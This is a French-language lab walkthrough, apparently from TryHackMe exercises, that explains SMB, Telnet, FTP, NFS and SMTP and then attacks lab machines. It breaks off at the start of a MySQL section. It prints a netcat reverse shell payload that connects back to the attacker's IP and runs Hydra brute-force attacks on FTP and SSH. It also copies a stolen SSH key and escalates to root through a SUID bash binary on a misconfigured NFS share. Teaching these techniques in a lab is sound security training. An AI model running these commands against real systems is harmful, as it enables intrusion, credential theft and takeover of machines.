# SMB

## **Comment fonctionne le SMB ?**

Le SMB (Server Message Block Protocol) est un protocole de communication client-serveur utilisé pour partager l'accès aux fichiers, imprimantes, ports série et autres ressources sur un réseau.

Les serveurs mettent à disposition des systèmes de fichiers et d'autres ressources (imprimantes, pipes nommés, APIs) aux clients sur le réseau. Les ordinateurs clients peuvent avoir leurs propres disques durs, mais ils veulent également accéder aux systèmes de fichiers et aux imprimantes partagés sur les serveurs.

Le protocole SMB est connu comme un protocole de requête-réponse, ce qui signifie qu'il transmet plusieurs messages entre le client et le serveur pour établir une connexion. Les clients se connectent aux serveurs en utilisant TCP/IP (en fait NetBIOS sur TCP/IP comme spécifié dans les RFC1001 et RFC1002), NetBEUI ou IPX/SPX.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/dd2db0d9-37b3-4906-926d-433b8c9d0091/d7b31f1d-20bc-426f-b45d-b5ab6c6f4c3a/Untitled.png)

**Comment fonctionne SMB ?**

Une fois qu'ils ont établi une connexion, les clients peuvent alors envoyer des commandes (SMBs) au serveur qui leur permettent d'accéder aux partages, d'ouvrir des fichiers, de lire et d'écrire des fichiers, et généralement de faire tout ce que l'on veut faire avec un système de fichiers. Cependant, dans le cas de SMB, ces opérations sont effectuées sur le réseau.

**Qu'est-ce qui exécute SMB ?**

Les systèmes d'exploitation Microsoft Windows depuis Windows 95 incluent la prise en charge du protocole SMB pour les clients et les serveurs. Samba, un serveur open source qui prend en charge le protocole SMB, a été publié pour les systèmes Unix.

- **Qu'est-ce que signifie SMB ?**
    
    SMB signifie **Server Message Block**.
    
- **Quel type de protocole est SMB ?**
    
    SMB est un protocole de communication **client-serveur** utilisé pour le partage de fichiers, d'imprimantes et d'autres ressources sur un réseau.
    
    **Requete/Reponse**
    
- **À quoi les clients se connectent-ils pour utiliser SMB ?**
    
    Les clients se connectent aux serveurs en utilisant **TCP/IP** (en fait NetBIOS sur TCP/IP comme spécifié dans les RFC1001 et RFC1002), **NetBEUI** ou **IPX/SPX**.
    
- **Sur quels systèmes Samba fonctionne-t-il ?**
    
    Samba, un serveur open source qui supporte le protocole SMB, fonctionne sur les **systèmes Unix**.
    

**Enumération**

L'énumération est le processus de collecte d'informations sur une cible afin de trouver des vecteurs d'attaque potentiels et d'aider à l'exploitation.

Ce processus est essentiel pour qu'une attaque soit réussie, car perdre du temps avec des exploits qui ne fonctionnent pas ou qui peuvent planter le système peut être une perte d'énergie. L'énumération peut être utilisée pour collecter des noms d'utilisateur, des mots de passe, des informations sur le réseau, des noms d'hôte, des données d'application, des services, ou toute autre information pouvant être précieuse pour un attaquant.

**SMB**

Typiquement, il y a des lecteurs de partage SMB sur un serveur auxquels on peut se connecter et utiliser pour visualiser ou transférer des fichiers. SMB peut souvent être un excellent point de départ pour un attaquant cherchant à découvrir des informations sensibles — vous seriez surpris de ce qui est parfois inclus dans ces partages.

**Analyse de ports**

La première étape de l'énumération consiste à effectuer une analyse de ports, pour recueillir autant d'informations que possible sur les services, les applications, la structure et le système d'exploitation de la machine cible.

## **Enum4Linux**

Enum4linux est un outil utilisé pour énumérer les partages SMB sur les systèmes Windows et Linux. C'est essentiellement un wrapper autour des outils du package Samba, ce qui permet d'extraire rapidement des informations de la cible concernant SMB.

La syntaxe d'Enum4Linux est simple et pratique : 

```bash
enum4linux [options] ip
```

**TAG | FONCTION**

- **U** : obtenir la liste des utilisateurs
- **M** : obtenir la liste des machines
- **N** : obtenir un dump de la liste des noms (différent de -U et -M)
- **S** : obtenir la liste des partages
- **P** : obtenir des informations sur la politique de mot de passe
- **G** : obtenir la liste des groupes et des membres
- **a** : toutes les options ci-dessus (énumération de base complète)
- **n :** obtenir le nom NetBIOS de la machine
- **o :** obtenir des informations sur l’OS

Cela permet aux utilisateurs d'effectuer une énumération rapide et complète des informations SMB sur une cible donnée.

## **SMBClient**

Comme nous essayons d'accéder à un partage SMB, nous avons besoin d'un client pour accéder aux ressources sur les serveurs. Nous utiliserons SMBClient car il fait partie de la suite samba par défaut. 

Nous pouvons accéder à distance au partage SMB en utilisant la syntaxe suivante :

```bash
smbclient //[IP]/[SHARE]

```

Suivi des tags :

- **U [nom]** : pour spécifier l'utilisateur
- **p [port]** : pour spécifier le port

Cette commande permet d'accéder aux ressources partagées sur un serveur SMB de manière sécurisée et efficace.

**Exercice :**

- Quelle serait la syntaxe correcte pour accéder à un partage SMB appelé "secret" en tant qu'utilisateur "suit" sur une machine avec l'IP 10.10.10.2 sur le port par défaut ?
    
    ```bash
    smbclient [//10.10.10.2/secret](notion://10.10.10.2/secret) -U suit
    ```
    

# Telnet

## **Qu'est-ce que Telnet ?**

Telnet est un protocole d'application qui permet, avec l'utilisation d'un client telnet, de se connecter et d'exécuter des commandes sur une machine distante hébergeant un serveur telnet.

Le client telnet établira une connexion avec le serveur. Le client deviendra alors un terminal virtuel, vous permettant d'interagir avec l'hôte distant.

**Remplacement**

Telnet envoie tous les messages en texte clair et ne dispose d'aucun mécanisme de sécurité spécifique. Ainsi, dans de nombreuses applications et services, Telnet a été remplacé par SSH dans la plupart des implémentations.

## **Comment fonctionne Telnet ?**

L'utilisateur se connecte au serveur en utilisant le protocole Telnet, ce qui signifie entrer "telnet" dans une invite de commande. L'utilisateur exécute ensuite des commandes sur le serveur en utilisant des commandes Telnet spécifiques dans l'invite Telnet. Vous pouvez vous connecter à un serveur telnet avec la syntaxe suivante :

```bash
telnet [ip] [port]

```

## Conclusion

Le Telnet est un protocol d’application, il s’est fait remplacé par SSH et son manque de chiffrement fait qu’on peut voir les données ne claire.

## Exploitation

Comme les autres protocoles nous pouvons regarder les CVE afin d’exploiter ces failles. Surtout que le Telnet comme dit précédemment n’est pas trop sécurisé par son manque de chiffrement et son faible contrôle d’accès .

Cependant nous avons plus de chance de pouvoir exploiter une mauvaise configuration.

Pour se faire nous pouvons utiliser le **Reverse Shell,**  Un "shell" peut simplement être décrit comme un morceau de code ou un programme qui peut être utilisé pour obtenir l'exécution de code ou de commandes sur un appareil.

Un reverse shell  est un type de shell dans lequel la machine cible communique avec la machine attaquante.

La machine attaquante a un port d'écoute sur lequel elle reçoit la connexion, ce qui permet d'obtenir l'exécution de code ou de commandes.

On va exécuter ce code dans notre machine. Je ne change rien à cette commande. Je le laisse tel quel et je l’exécute.

```bash
sudo tcpdump ip proto \\icmp -i tun0
```

- **`tcpdump`** : C'est un utilitaire de ligne de commande qui permet de capturer et d'afficher les paquets circulant sur un réseau.
- **`ip proto \\icmp`** : Ce filtre indique à `tcpdump` de capturer uniquement les paquets utilisant le protocole ICMP. ICMP est couramment utilisé pour des opérations de diagnostic réseau telles que le ping.
- **`i tun0`** : Spécifie l'interface réseau à partir de laquelle capturer les paquets. `tun0` est typiquement une interface réseau virtuelle utilisée par des tunnels VPN ou d'autres types de tunnels réseau.

Cette commande capture et affiche en temps réel les paquets ICMP (par exemple, des requêtes et réponses ping) qui passent par l'interface réseau `tun0`.

Je ping depuis le shell distant ma machine local et je peux voir que je reçois les ICMP. Je vais utiliser un payload pour avoir accès au shell depuis mon shell pour être moins restreint.

Je vais utiliser cette commande pour générer mon payload.

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

La commande `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R` est utilisée pour générer un payload de type reverse shell pour Unix/Linux, qui se connecte à un hôte local via Netcat. Voici une explication détaillée de chaque composant de cette commande :

1. **`msfvenom`** : C'est un outil utilisé pour créer et encoder des payloads pour Metasploit. Il permet de combiner des payloads avec divers encodeurs, formant des exploits autonomes.
2. **`p cmd/unix/reverse_netcat`** : Ce paramètre spécifie le type de payload à utiliser. Ici, il s'agit d'un reverse shell qui utilise Netcat (`cmd/unix/reverse_netcat`). Un reverse shell est un shell qui se connecte à un serveur distant, permettant à l'attaquant de prendre le contrôle du système compromis.
3. **`lhost=[local tun0 ip]`** : Ce paramètre spécifie l'adresse IP de l'hôte local (l'attaquant) où le reverse shell se connectera. Vous devez remplacer `[local tun0 ip]` par l'adresse IP de votre interface `tun0`.
4. **`lport=4444`** : Ce paramètre spécifie le port sur lequel l'hôte local (l'attaquant) écoutera les connexions entrantes du reverse shell. Ici, le port est 4444, mais vous pouvez choisir un autre port si nécessaire.
5. **`R`** : Ce paramètre indique que le payload doit être affiché en tant que chaîne brute (Raw). Cette option est utilisée pour afficher le code généré directement sur la console.

Cette commande génère un payload de reverse shell pour Unix/Linux utilisant Netcat. Lorsque ce payload est exécuté sur une machine cible, il tentera de se connecter à l'adresse IP spécifiée (`lhost`) sur le port spécifié (`lport`). Une fois connecté, l'attaquant obtient un accès shell à la machine cible.

Pour utiliser ce payload, il est typiquement nécessaire de mettre en place un écouteur sur l'adresse IP et le port spécifiés. Vous pouvez utiliser Netcat pour cela, par exemple :

```bash
nc -lvnp 4444
```

Cela permettrait à l'attaquant d'attendre les connexions entrantes sur le port 4444 et de prendre le contrôle du shell lorsqu'une connexion est établie.

Je lance ma commande pour le payload ensuite je lance mon netcat avec la commande `nc` . Je termine par lancer le payload dans le shell distant. Dans mon cas le payload qu’à générer le msfvenom est `mkfifo /tmp/gehxlw; nc 10.9.3.36 4444 0</tmp/gehxlw | /bin/sh >/tmp/gehxlw 2>&1; rm /tmp/gehxlw`.

Je profite de l’exploit.

# FTP

FTP, ou File Transfer Protocol, est un protocole utilisé pour transférer des fichiers sur un réseau. Il fonctionne sur un modèle client-serveur où un client initie une connexion à un serveur pour effectuer des transferts de fichiers.

Voici comment FTP fonctionne typiquement :

1. **Modèle Client-Serveur** : FTP utilise une architecture client-serveur. Le client, tel qu'un ordinateur ou une application logicielle, établit une connexion avec le serveur FTP.
2. **Deux Canaux** : Les sessions FTP utilisent deux canaux distincts :
    - **Canal de Commande** : Aussi appelé canal de contrôle, ce canal est utilisé pour transmettre les commandes du client vers le serveur et les réponses du serveur vers le client.
    - **Canal de Données** : Ce canal est utilisé exclusivement pour transférer des données, telles que des fichiers, entre le client et le serveur.
3. **Initialisation de la Session** :
    - Le client établit une connexion avec le serveur.
    - Le serveur authentifie le client en validant les informations d'identification de connexion.
    - Une fois authentifié, le serveur ouvre une session FTP.
4. **Commandes FTP** : Pendant la session, le client peut émettre diverses commandes FTP pour effectuer des opérations sur le serveur, telles que lister des répertoires, téléverser des fichiers, télécharger des fichiers, supprimer des fichiers, etc.
5. **FTP Actif vs Passif** :
    - **FTP Actif** : Le client initie une connexion au serveur sur un port spécifié, et le serveur se connecte ensuite au client pour transférer des données.
    - **FTP Passif** : Le serveur ouvre un port d'écoute, et le client se connecte au serveur pour transférer des données. Le mode passif est souvent utilisé lorsque le client est derrière un pare-feu ou une translation d'adresses réseau (NAT).
6. **Efficacité** : La séparation des canaux de commande et de données permet à FTP d'être efficace. Les commandes et les réponses peuvent être échangées indépendamment des transferts de données, ce qui est essentiel pour gérer les transferts de fichiers volumineux ou lorsque les conditions du réseau sont lentes.

En résumé, FTP est un protocole largement utilisé pour transférer des fichiers entre des ordinateurs via un réseau. Il offre une méthode structurée pour que les clients communiquent avec les serveurs, facilitant ainsi la gestion et les opérations de transfert de fichiers.

Pour me connecter sur un port FTP.

```bash
ftp [IP]
```

Je peux essayer d’utiliser l’utilisateur : anonymous et ne pas rentrer de mot de passe.

Pendant l’enum si je réussis à avoir des informations utiles comme un nom d’utilisateur, un manque de robustesse des mots de passes, etc je peux essayer de brute force la connexion.

Lors de mon investigation sur la machine, j’ai découvert un message d’un certain Mike, je vais essayer d’utilier mike comme pseudo et bruteforce avec hydra.

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt  10.10.201.106 ftp
```

- hydra: C'est un outil populaire utilisé pour effectuer des attaques par force brute, entre autres types d'attaques, contre des services réseau.
- -t 4: Cela spécifie que Hydra utilisera 4 threads simultanés pour accélérer le processus d'attaque.
- -l mike: C'est le nom d'utilisateur que Hydra utilisera pour tenter de se connecter au serveur FTP.
- -P /usr/share/wordlists/rockyou.txt: Spécifie le chemin vers le fichier contenant une liste de mots de passe à tester. Le fichier /usr/share/wordlists/rockyou.txt est une liste de mots de passe courants utilisée fréquemment pour les tests de sécurité.
- 10.10.201.106: C'est l'adresse IP du serveur FTP cible.
- ftp: Indique que le service cible est FTP. J’aurais très bien pu choisir un autre protocol comme ssh par exemple.

# NFS

NFS, abréviation de "Network File System", est un protocole permettant à un système de partager des répertoires et des fichiers avec d'autres systèmes sur un réseau. En utilisant NFS, les utilisateurs et les programmes peuvent accéder à des fichiers sur des systèmes distants presque comme s'ils étaient des fichiers locaux. Cela est rendu possible en montant tout ou une partie d'un système de fichiers sur un serveur. La partie du système de fichiers qui est montée peut être accédée par les clients avec les privilèges qui leur sont attribués pour chaque fichier.

Voici comment fonctionne NFS :

1. **Montage de fichiers partagés** :
    - Le client demande de monter un répertoire depuis un hôte distant sur un répertoire local, de la même manière qu'il peut monter un périphérique physique.
    - Le service de montage agit ensuite pour se connecter au démon de montage pertinent en utilisant RPC (Remote Procedure Call).
2. **Vérification des permissions sur le serveur** :
    - Le serveur vérifie si l'utilisateur a la permission de monter le répertoire demandé.
    - Il renvoie alors un "file handle" qui identifie de manière unique chaque fichier et répertoire sur le serveur.
3. **Accès aux fichiers** :
    - Lorsqu'un utilisateur souhaite accéder à un fichier via NFS, un appel RPC est placé vers le démon NFSD (NFS daemon) sur le serveur.
    - Cet appel prend des paramètres tels que le "file handle", le nom du fichier à accéder, l'ID utilisateur et l'ID de groupe de l'utilisateur.
    - Ces informations sont utilisées pour déterminer les droits d'accès au fichier spécifié, régissant ainsi les permissions de lecture et d'écriture.

NFS est utilisé pour transférer des fichiers entre des ordinateurs fonctionnant sous différentes plateformes, y compris Windows, Linux, MacOS ou UNIX. Un serveur NFS sous Windows Server peut servir de serveur de fichiers NFS pour d'autres ordinateurs clients non-Windows, et inversement, NFS permet à un ordinateur Windows exécutant Windows Server d'accéder aux fichiers stockés sur un serveur NFS non-Windows.

Pour effectuer une énumération avancée du serveur NFS et de ses partages, nous aurons besoin de quelques outils. Le premier d'entre eux est essentiel pour interagir avec n'importe quel partage NFS depuis votre machine locale : nfs-common.

NFS-Common

Il est crucial d'installer ce package sur toute machine utilisant NFS, que ce soit en tant que client ou serveur. Il inclut des programmes tels que : lockd, statd, showmount, nfsstat, gssd, idmapd et mount.nfs. Nous nous intéressons principalement à "showmount" et "mount.nfs" car ce sont ces outils qui nous seront les plus utiles pour extraire des informations des partages NFS. Pour plus d'informations sur ce package, vous pouvez consulter : https://packages.ubuntu.com/jammy/nfs-common.

Vous pouvez installer nfs-common en utilisant la commande suivante : "sudo apt install nfs-common".

La commande suivante permet de lister les partages NFS.

```bash
 /usr/sbin/showmount -e [IP]
```

En utilisant cette commande, on tombe sur un partage /home. On va monter ce partage sur notre machine local pour pouvoir accéder aux informations à l’intérieur. 

Tout d’abord, nous allons créer un répertoire spécifique.

```bash
mkdir /tmp/mount
```

Ensuite nous allons utiliser une commande pour monter le partage sur cet espace créer.

```bash
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

- **sudo** : Permet d'exécuter une commande en tant que superutilisateur (root). Cela donne les permissions nécessaires pour effectuer des opérations qui requièrent des droits administratifs.
- **mount** : Commande utilisée pour monter un système de fichiers sur Linux. Elle permet de rendre accessible un système de fichiers à partir d'un périphérique de stockage ou d'un serveur distant.
- **t nfs** : Option de la commande mount qui spécifie le type de périphérique à monter, dans ce cas, NFS (Network File System). Cela indique que le système de fichiers à monter est un partage NFS.
- **IP**: L'adresse IP du serveur NFS suivi du nom du partage que l'on souhaite monter. C'est la manière dont on indique à mount où trouver le partage NFS spécifique sur le réseau.
- **nolock** : Option de la commande mount qui spécifie de ne pas utiliser le verrouillage NLM (Network Lock Manager). Cela désactive la gestion des verrous NFS, ce qui peut être nécessaire dans certains scénarios pour éviter des problèmes de performance ou de compatibilité.

En résumé, la commande que vous avez décrite montre comment monter un partage NFS spécifique en utilisant l'adresse IP du serveur NFS et le nom du partage, tout en spécifiant de ne pas utiliser le verrouillage NLM. Assurez-vous d'avoir les droits nécessaires (en utilisant sudo) pour exécuter cette commande avec succès.

Dans notre cas ce sera :  sudo mount -t nfs 10.10.47.148:/home /tmp/mount/ -nolock

On n’a plus qu’à verifier ce qu’on a dans ce répertoire et surprise ! On retrouve un répertoire nommé “cappucino”. On examine ce qu’il y a à l’intérieur pour voir si on a pas quelque chose d’intéressant.

Je trouve le id_rsa !  Je n’ai plus qu’à le copier sur ma machine et changer les permissions en chmod 600. Me connecter grâce à :

```bash
ssh -i <key-file> <username>@<ip>
```

Dans mon cas ce sera : **ssh -i ~/THM/id_rsa [cappucino@10.10.47.148](mailto:cappucino@10.10.47.148)**

Nous avons terminé, n'est-ce pas ?

Pas tout à fait. Si vous avez un shell avec des privilèges limités sur une machine et que vous découvrez qu'une machine possède un partage NFS, vous pourriez potentiellement utiliser cela pour escalader les privilèges, selon sa configuration.

Qu'est-ce que root_squash ?

Par défaut, sur les partages NFS, le root_squash est activé et empêche toute personne se connectant au partage NFS d'avoir un accès root au volume NFS. Les utilisateurs root distants sont assignés à l'utilisateur "nfsnobody" lorsqu'ils se connectent, qui possède le moins de privilèges locaux. Ce n'est pas ce que nous voulons. Cependant, s'il est désactivé, cela peut permettre la création de fichiers avec le bit SUID, permettant à un utilisateur distant d'obtenir un accès root au système connecté.

SUID

Alors, qu'est-ce que sont les fichiers avec le bit SUID activé ? Essentiellement, cela signifie que le fichier ou les fichiers peuvent être exécutés avec les permissions du propriétaire/groupe du fichier. Dans ce cas, en tant que super-utilisateur. Nous pouvons exploiter cela pour obtenir un shell avec ces privilèges !

Méthode

Cela semble compliqué, mais en réalité, tant que vous êtes familiarisé avec le fonctionnement des fichiers SUID, c'est assez simple à comprendre. Nous sommes capables de télécharger des fichiers vers le partage NFS et de contrôler les permissions de ces fichiers. Nous pouvons définir les permissions de ce que nous téléchargeons, dans ce cas un exécutable de shell bash. Ensuite, nous pouvons nous connecter via SSH, comme nous l'avons fait dans la tâche précédente, et exécuter cet exécutable pour obtenir un shell root !

L'Exécutable

Pour des raisons de compatibilité, nous obtiendrons directement l'exécutable bash à partir de la machine cible.
Avec la clé obtenue lors de la tâche précédente, nous pouvons utiliser SCP avec la commande scp -i nom_de_la_clé nom_utilisateur@IP_MACHINE:/bin/bash ~/Downloads/bash pour le télécharger sur notre machine d'attaque.

Une autre méthode pour surmonter les problèmes de compatibilité consiste à obtenir un exécutable bash standard d'Ubuntu Server 18.04, identique à celui du serveur, comme indiqué dans notre analyse nmap. Vous pouvez le télécharger ici. Si vous souhaitez le télécharger via la ligne de commande, soyez prudent de ne pas télécharger la page GitHub au lieu du script brut. Vous pouvez utiliser wget [https://github.com/polo-sec/writing/raw/master/Security Challenge Walkthroughs/Networks 2/bash](https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). Notez que cette méthode nécessite une connexion internet, vous ne pourrez donc pas la télécharger en utilisant une AttackBox gratuite.

Cheminement Mappé :

Si cela reste difficile à suivre, voici une explication étape par étape des actions que nous entreprenons et de leur relation, permettant finalement d'obtenir un shell root :

```
Accès NFS ->

    Obtention d'un Shell à Privilèges Limités ->

        Téléchargement d'un Exécutable Bash vers le Partage NFS ->

            Définition des Permissions SUID via NFS en raison d'un root squash mal configuré ->

                Connexion via SSH ->

                    Exécution de l'Exécutable Bash avec le Bit SUID ->

                        ACCÈS ROOT

```

Donc j’ai besoin de prendre le bash sur ma machine dans un premier temps. 

```bash
scp -i key_name username@10.10.78.147:/bin/bash ~/Downloads/bash
```

Dans mon cas c’est : `scp -i ~/THM/id_rsa [cappucino@10.10.78.147](mailto:cappucino@10.10.78.147):/bin/bash ~/Downloads/bash`

Je vais ensuite le copier dans l’emplacement de partage monté sur ma machine. 

```bash
cp ~/Downloads/bash /tmp/mount/cappucino
```

Je dois changer le propriétaire et mettre l’option SUID.

```bash
sudo chown root bash
sudo chmod +s bash
#Ce qui me donne ça comme permissions:
.rwsr-sr-x@ 1.1M root 17 Jul 08:35  bash
```

Je me connecte au ssh et j’execute le bash avec `./bash -p` . Le -p permet de persister dans les permissions.

Je cd dans /root et j’obtiens le flag.

# SMTP

SMTP

SMTP signifie "Simple Mail Transfer Protocol". Il est utilisé pour gérer l'envoi des e-mails. Pour prendre en charge les services de messagerie, une paire de protocoles est nécessaire, comprenant SMTP et POP/IMAP. Ensemble, ils permettent à l'utilisateur d'envoyer des mails sortants et de récupérer des mails entrants, respectivement.

Le serveur SMTP effectue trois fonctions de base :

- Il vérifie qui envoie des e-mails via le serveur SMTP.
- Il envoie le courrier sortant.
- Si le courrier sortant ne peut pas être livré, il renvoie le message à l'expéditeur.

La plupart des gens ont rencontré SMTP lors de la configuration d'une nouvelle adresse e-mail sur certains clients de messagerie tiers, tels que Thunderbird ; car lorsque vous configurez un nouveau client de messagerie, vous devez configurer la configuration du serveur SMTP pour envoyer des e-mails sortants.

POP et IMAP

POP, ou "Post Office Protocol" et IMAP, "Internet Message Access Protocol" sont tous deux des protocoles de messagerie responsables du transfert de courriers électroniques entre un client et un serveur de messagerie. La principale différence réside dans l'approche plus simpliste de POP consistant à télécharger la boîte de réception du serveur de messagerie vers le client. Tandis qu'IMAP synchronise la boîte de réception actuelle, avec les nouveaux mails sur le serveur, téléchargeant tout ce qui est nouveau. Cela signifie que les modifications apportées à la boîte de réception sur un ordinateur, via IMAP, persisteront si vous synchronisez ensuite la boîte de réception à partir d'un autre ordinateur. Le serveur POP/IMAP est responsable de ce processus.

Comment fonctionne SMTP ?

La livraison des e-mails fonctionne de la même manière que le système de livraison du courrier physique. L'utilisateur fournit l'e-mail (une lettre) et un service (le service de livraison postal), et à travers une série d'étapes, le délivre à la boîte de réception du destinataire (boîte aux lettres). Le rôle du serveur SMTP dans ce service est d'agir comme le bureau de tri, l'e-mail (lettre) est récupéré et envoyé à ce serveur, qui le dirige ensuite vers le destinataire.

Nous pouvons cartographier le parcours d'un e-mail de votre ordinateur à celui du destinataire comme suit :

1. L'agent utilisateur de messagerie, qui est soit votre client de messagerie, soit un programme externe, se connecte au serveur SMTP de votre domaine, par exemple [smtp.google.com](http://smtp.google.com/). Cela initie la poignée de main SMTP. Cette connexion fonctionne sur le port SMTP - qui est généralement le 25. Une fois ces connexions établies et validées, la session SMTP commence.
2. Le processus d'envoi de mails peut maintenant commencer. Le client soumet d'abord l'adresse e-mail de l'expéditeur et du destinataire, le corps de l'e-mail et toutes pièces jointes, au serveur.
3. Le serveur SMTP vérifie ensuite si le nom de domaine du destinataire et de l'expéditeur est le même.
4. Le serveur SMTP de l'expéditeur établira une connexion avec le serveur SMTP du destinataire avant de relayer l'e-mail. Si le serveur du destinataire ne peut pas être accédé, ou n'est pas disponible, l'e-mail est mis dans une file d'attente SMTP.
5. Ensuite, le serveur SMTP du destinataire vérifiera l'e-mail entrant. Il le fait en vérifiant si le domaine et le nom d'utilisateur sont reconnus. Le serveur transmettra ensuite l'e-mail au serveur POP ou IMAP, comme indiqué dans le schéma ci-dessus.
6. L'e-mail apparaîtra alors dans la boîte de réception du destinataire.

C'est une version très simplifiée du processus, et il y a beaucoup de sous-protocoles, de communications et de détails qui n'ont pas été inclus. Si vous cherchez à en savoir plus sur ce sujet, voici une explication très conviviale des détails techniques - je l'ai en fait utilisée pour écrire ce résumé :

[Comment fonctionne un email ?](https://computer.howstuffworks.com/e-mail-messaging/email3.htm)

Qu'est-ce qui exécute SMTP ?

Le logiciel de serveur SMTP est facilement disponible sur les plateformes de serveur Windows, avec de nombreuses autres variantes de SMTP disponibles pour fonctionner sur Linux.

Plus d'informations :

Voici une ressource qui explique la mise en œuvre technique et le fonctionnement de SMTP plus en détail que ce que j'ai couvert ici.

[SMTP en détail](https://www.afternerd.com/blog/smtp/)

### Détails sur l'énumération des serveurs

Les serveurs de messagerie mal configurés ou vulnérables peuvent souvent fournir un point d'accès initial à un réseau, mais avant de lancer une attaque, nous voulons identifier le serveur pour rendre notre ciblage aussi précis que possible. Nous allons utiliser le module "smtp_version" dans MetaSploit pour ce faire. Comme son nom l'indique, il scannera une gamme d'adresses IP et déterminera la version des serveurs de messagerie qu'il rencontre.

### Énumération des utilisateurs depuis SMTP

Le service SMTP possède deux commandes internes qui permettent l'énumération des utilisateurs : VRFY (confirmation des noms d'utilisateurs valides) et EXPN (qui révèle l'adresse réelle des alias des utilisateurs et des listes de diffusion). En utilisant ces commandes SMTP, nous pouvons révéler une liste d'utilisateurs valides.

Nous pouvons le faire manuellement, via une connexion telnet - cependant Metasploit vient à la rescousse, en fournissant un module pratique appelé "smtp_enum" qui fera le travail pour nous ! Utiliser le module est une simple question de lui fournir un hôte ou une gamme d'hôtes à scanner et une liste de mots contenant des noms d'utilisateurs à énumérer.

### Exigences

Comme nous allons utiliser Metasploit pour cela, il est important que vous ayez Metasploit installé. Il l'est par défaut sur Kali Linux et Parrot OS ; cependant, il vaut toujours la peine de faire une mise à jour rapide pour s'assurer que vous êtes sur la dernière version avant de lancer toute attaque. Vous pouvez le faire avec un simple "sudo apt update", et une mise à niveau accompagnante si nécessaire.

### Alternatives

Il est à noter que cette technique d'énumération fonctionnera pour la majorité des configurations SMTP ; cependant, il existe d'autres outils non-Metasploit comme smtp-user-enum qui fonctionnent encore mieux pour énumérer les comptes utilisateurs au niveau du système d'exploitation sur Solaris via le service SMTP. L'énumération est effectuée en inspectant les réponses aux commandes VRFY, EXPN et RCPT TO.

Cette technique pourrait être adaptée à l'avenir pour fonctionner contre d'autres démons SMTP vulnérables, mais cela n'a pas été fait au moment de la rédaction. C'est une alternative à garder à l'esprit si vous essayez de vous éloigner de l'utilisation de Metasploit, par exemple en préparation pour l'OSCP.

Maintenant que nous avons couvert la théorie. Allons-y !

Pour commencer à utiliser Metasploit, nous allons utiliser la commande `msfconsole`.

Pour chercher un module, nous utiliserons la commande `search` , pour obtenir le module smtp_version. Je dois donc mettre `search smtp_version` . J’obtiens donc auxiliary/scanner/smtp/smtp_version.

On va devoir configurer le module pour lancer convenablement ce dernier. Pour configurer ou juste voir les configurations, je tape `options` . Ici on remarque que tout est bon mais que le RHOSTS n’a pas de valeur. RHOSTS pour remote host. On doit donc mettre l’IP de la cible. Pour se faire on utilise la commande `set` suivi de l’option qu’on veut changer et la nouvelle valeur.

```bash
set RHOSTS 10.10.51.213
#RHOSTS => 10.10.51.213
```

Maintenant que tout est bon, on peut lancer notre module pour se faire, on va utiliser la commande `run` ou `exploit` 

```bash
+] 10.10.51.213:25       - 10.10.51.213:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.51.213:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- polosmtp.home est le nom du système mail.
- Postfix est le MTA (Mail Transfer Agent)
- smtp_version nous permet d’avoir des informations sur le système.

smtp_enum nous donne des informations comme les utilisateurs.  Le module nous a donné un utilisateur nommée "administrator”

On peut essayer hydra pour avoir un accès en bruteforce

Qu'est-ce que nous savons ?

À la fin de notre section sur l'énumération, nous avons quelques informations vitales :

1. Un nom de compte utilisateur
2. Le type de serveur SMTP et le système d'exploitation en cours d'exécution

Nous savons, grâce à notre scan de ports, que le seul autre port ouvert sur cette machine est une connexion SSH. Nous allons utiliser cette information pour essayer de forcer brutalement le mot de passe de la connexion SSH pour notre utilisateur en utilisant Hydra.

Préparation

Il est conseillé de quitter Metasploit pour continuer l'exploitation de cette section. Deuxièmement, il est utile de garder une note des informations que vous avez recueillies pendant la phase d'énumération, afin d'aider à l'exploitation.

Hydra

Il existe une large gamme de personnalisations lorsqu'il s'agit d'utiliser Hydra, et il permet des attaques par mot de passe adaptatives contre de nombreux services différents, y compris SSH. Hydra est fourni par défaut sur Parrot et Kali, cependant si vous en avez besoin, vous pouvez le trouver sur GitHub.

Hydra utilise principalement des attaques par dictionnaire, à la fois Kali Linux et Parrot OS ont de nombreuses listes de mots différentes dans le répertoire "/usr/share/wordlists" - si vous souhaitez parcourir et trouver des listes de mots différentes de la très utilisée "rockyou.txt". De même, je recommande de consulter SecLists pour une gamme plus large d'autres listes de mots qui sont extrêmement utiles pour toutes sortes de tâches, autres que le simple craquage de mots de passe. Par exemple, l'énumération des sous-domaines.

Commande Hydra

La syntaxe de la commande que nous allons utiliser pour trouver les mots de passe est la suivante :

```bash
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.51.213 ssh

```

Décomposition de la commande

| SECTION | FONCTION |
| --- | --- |
| `hydra` | Exécute l'outil Hydra |
| `-t 16` | Nombre de connexions parallèles par cible |
| `-l [user]` | Désigne l'utilisateur dont vous essayez de compromettre le compte |
| `-P [path to dictionary]` | Désigne le fichier contenant la liste des mots de passe possibles |
| `-vV` | Définit le mode verbeux sur très verbeux, montre la combinaison login+pass pour chaque tentative |
| `[machine IP]` | L'adresse IP de la machine cible |
| `ssh` | Définit le protocole |

Exemple de commande

Pour l'utilisateur "username" et l'adresse IP de la machine cible "10.10.51.213", la commande serait :

```bash
hydra -t 16 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.51.213 ssh

```

Explication des options :

- `t 16` : Exécute 16 connexions parallèles, ce qui peut accélérer le processus de craquage.
- `l username` : Spécifie le nom de l'utilisateur dont vous essayez de trouver le mot de passe.
- `P /usr/share/wordlists/rockyou.txt` : Utilise le fichier rockyou.txt comme liste de mots de passe.
- `vV` : Active le mode très verbeux, affichant chaque tentative de connexion.
- `10.10.51.213` : L'adresse IP de la cible.
- `ssh` : Indique que le service cible est SSH.

# MySQL

**Qu'est-ce que MySQL ?**

Dans sa définition la plus simple, MySQL est un système de gestion de base de données relationnelle (SGBDR) basé sur le langage SQL (Structured Query Language). Trop d'acronymes ? Décomposons cela :

